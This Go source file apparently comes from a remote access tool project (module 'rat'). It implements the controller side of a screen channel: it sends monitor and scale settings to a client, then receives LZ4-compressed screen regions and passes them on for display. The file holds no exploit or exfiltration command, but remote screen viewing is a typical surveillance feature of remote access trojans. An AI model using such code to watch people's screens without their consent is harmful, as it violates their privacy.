package main

import (
	"bytes"
	"encoding/binary"
	"io"
	"io/ioutil"
	"rat/internal/network/header"

	"github.com/pierrec/lz4"
)

type ScreenChannel struct {
	Monitor bool
	ID      int32
	Scale   float32

	controller *Controller
}

func (ScreenChannel) Header() header.PacketHeader {
	return header.ScreenHeader
}

func (sc *ScreenChannel) init(channel io.Writer) (err error) {
	binary.Write(channel, binary.LittleEndian, sc.Monitor)
	binary.Write(channel, binary.LittleEndian, sc.Scale)
	err = binary.Write(channel, binary.LittleEndian, sc.ID)

	return
}

func (sc ScreenChannel) Open(channel io.ReadWriteCloser, c *Client) error {
	defer channel.Close()

	listener := sc.controller.Listen(ScreenEvent, c)
	defer listener.Unlisten()

	var err error

	err = sc.init(channel)

	go func() {
		for {
			select {
			case mi := <-listener.C:
				if mi == nil {
					channel.Close()
					return
				}

				msg := mi.(*ScreenMessage)

				if msg.Active {
					sc.init(channel)
				} else {
					channel.Close()
					return
				}
			case <-sc.controller.die:
				channel.Close()
				return
			case <-c.die:
				channel.Close()
				return
			}
		}
	}()

	for err == nil {
		var left, top, width, height int32

		binary.Read(channel, binary.LittleEndian, &left)
		binary.Read(channel, binary.LittleEndian, &top)
		binary.Read(channel, binary.LittleEndian, &width)
		err = binary.Read(channel, binary.LittleEndian, &height)
		if err != nil {
			break
		}

		var clen int32
		err = binary.Read(channel, binary.LittleEndian, &clen)

		if err != nil {
			break
		}

		buf := make([]byte, clen)
		_, err = io.ReadFull(channel, buf)

		ll := lz4.NewReader(bytes.NewReader(buf))
		decompressed, err := ioutil.ReadAll(ll)

		if err != nil {
			break
		}

		sendMessage(sc.controller, c, ScreenChunkMessage{
			Buffer: decompressed,
			X:      int(left),
			Y:      int(top),
			Width:  int(width),
			Height: int(height),
		})
	}

	return err
}
